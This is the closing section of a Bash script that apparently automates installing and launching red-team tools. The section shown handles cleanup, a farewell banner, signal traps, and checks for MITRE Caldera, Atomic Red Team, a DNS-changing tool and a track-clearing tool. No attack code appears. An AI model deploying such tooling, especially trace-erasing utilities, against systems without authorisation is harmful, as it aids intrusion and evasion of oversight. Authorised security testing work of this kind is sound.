        tar -czf "$backup_file" "$CONFIG_FILE" 2>/dev/null
        log "INFO" "Final backup created: $backup_file"
    fi
    
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                     THANK YOU FOR USING                                     ║${NC}"
    echo -e "${GREEN}║              ULTIMATE RED TEAM AUTOMATION v$VERSION                         ║${NC}"
    echo -e "${GREEN}║                                                                              ║${NC}"
    echo -e "${GREEN}║              Stay secure and test responsibly!                              ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    log "SUCCESS" "Script shutdown complete"
    exit 0
}

# ============================================================================
#                              SIGNAL HANDLERS
# ============================================================================

trap 'log "WARNING" "Script interrupted by user"; cleanup_and_exit' INT TERM
trap 'cleanup_and_exit' EXIT

# ============================================================================
#                              MAIN EXECUTION
# ============================================================================

main() {
    # Initial setup
    detect_os
    check_root
    check_dependencies
    init_config
    
    # Welcome message
    log "SUCCESS" "Ultimate Red Team Automation v$VERSION started successfully"
    log "INFO" "Operating System: $OS_PRETTY"
    log "INFO" "Configuration loaded from: $CONFIG_FILE"
    log "INFO" "Tools directory: $TOOLS_DIR"
    log "INFO" "Log file: $LOG_FILE"
    
    # RedHunt OS specific message
    if [[ "$OS_NAME" == "redhunt" ]]; then
        log "INFO" "RedHunt OS detected - Security tools pre-installed"
        log "INFO" "Snap support: $([[ "$SNAP_AVAILABLE" == "true" ]] && echo "Available" || echo "Not Available")"
    fi
    
    # Check for existing installations
    log "INFO" "Checking existing tool installations..."
    [[ -d "$CALDERA_DIR" ]] && log "INFO" "✓ MITRE Caldera found"
    [[ -d "$ATOMIC_RED_TEAM_DIR" ]] && log "INFO" "✓ Atomic Red Team found"
    [[ -f "$TOOLS_DIR/dns_changer_eye.py" ]] && log "INFO" "✓ DNS Changer Eye found"
    [[ -f "$TOOLS_DIR/cleartracks.sh" ]] && log "INFO" "✓ ClearTracks found"
    
    # Start main menu loop
    show_main_menu
}

# Start the script
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
